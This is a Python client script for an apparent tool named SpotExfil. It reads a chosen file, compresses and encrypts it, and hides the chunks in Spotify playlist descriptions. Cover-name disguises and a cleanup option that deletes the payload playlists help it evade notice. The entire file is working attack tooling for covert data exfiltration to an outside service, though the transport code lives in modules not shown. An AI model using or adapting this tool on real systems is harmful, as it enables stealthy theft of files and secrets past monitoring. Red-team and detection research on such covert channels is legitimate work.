#!/usr/bin/env python3
"""SpotExfil Client - Exfiltrate data via Spotify playlists.

Reads a file, compresses, encrypts (AES-256-GCM), and stores it
across Spotify playlist descriptions (512 chars each).

Credentials can be provided via environment variables or
~/.spotexfil.conf config file.
"""

import argparse

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'python'))
from spotexfil import crypto as encoding  # noqa: E402
from spotexfil import transport as spot  # noqa: E402

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def parse_args():
    """Parse command-line arguments.

    Returns:
        argparse.Namespace with parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description='SpotExfil: exfiltrate data via Spotify playlists'
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '-f', '--file',
        help='Path to the file to exfiltrate'
    )
    group.add_argument(
        '--clean', action='store_true',
        help='Remove all payload playlists and exit'
    )
    parser.add_argument(
        '-k', '--key', default=None,
        help='Encryption passphrase for AES-256-GCM (recommended)'
    )
    parser.add_argument(
        '--no-compress', action='store_true',
        help='Disable gzip compression'
    )
    parser.add_argument(
        '--legacy-names', action='store_true',
        help='Use N-payloadChunk naming instead of cover names'
    )
    return parser.parse_args()


def main():
    """Main entry point for the exfiltration client."""
    args = parse_args()

    spotify = spot.Spot(use_cover_names=not args.legacy_names)

    if args.clean:
        spotify.clear_data()
        return

    cipher = encoding.Subcipher(
        spotify,
        encryption_key=args.key,
        compress=not args.no_compress,
    )

    spotify.clear_data()
    encoded = cipher.encode_payload(args.file)
    spotify.generate_playlists(encoded)


if __name__ == "__main__":
    main()
